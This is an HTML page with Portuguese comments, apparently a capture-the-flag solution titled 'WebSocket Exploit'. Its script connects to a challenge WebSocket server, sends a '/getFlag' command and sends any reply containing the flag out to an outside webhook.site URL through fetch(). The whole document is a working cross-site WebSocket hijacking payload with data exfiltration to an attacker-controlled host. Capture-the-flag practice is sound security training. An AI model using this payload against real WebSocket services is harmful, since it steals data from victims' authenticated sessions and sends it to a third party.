<!DOCTYPE html>
<html>
  <head>
    <title>WebSocket Exploit</title>
  </head>
  <body>
    <h1>WebSocket Flag Capture</h1>
    <p>Exploit em execução...</p>

    <script>
      // URL do seu webhook (substitua pela sua URL do webhook.site)
      const webhookUrl =
        "https://webhook.site/849b249a-8980-4038-9d90-9fbaa89dc2f8";

      // Conectar ao WebSocket do alvo
      const socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");

      socket.onopen = function () {
        console.log("Conexão WebSocket estabelecida!");

        // Enviar comando para obter a flag
        setTimeout(function () {
          console.log("Enviando comando /getFlag...");
          socket.send(
            JSON.stringify({
              sender: "user",
              message: "/getFlag",
            })
          );
        }, 1000);
      };

      socket.onmessage = function (event) {
        const data = JSON.parse(event.data);
        console.log("Recebido: " + data.message);

        // Se a mensagem contiver a flag, enviar para nosso webhook
        if (data.message && data.message.includes("Flag:")) {
          // Fazer uma solicitação para o webhook com a flag
          fetch(webhookUrl + "?flag=" + encodeURIComponent(data.message), {
            method: "GET",
          })
            .then(() => {
              console.log("Flag enviada para o webhook!");
            })
            .catch((error) => {
              console.error("Erro ao enviar para webhook:", error);
            });
        }
      };
    </script>
  </body>
</html>
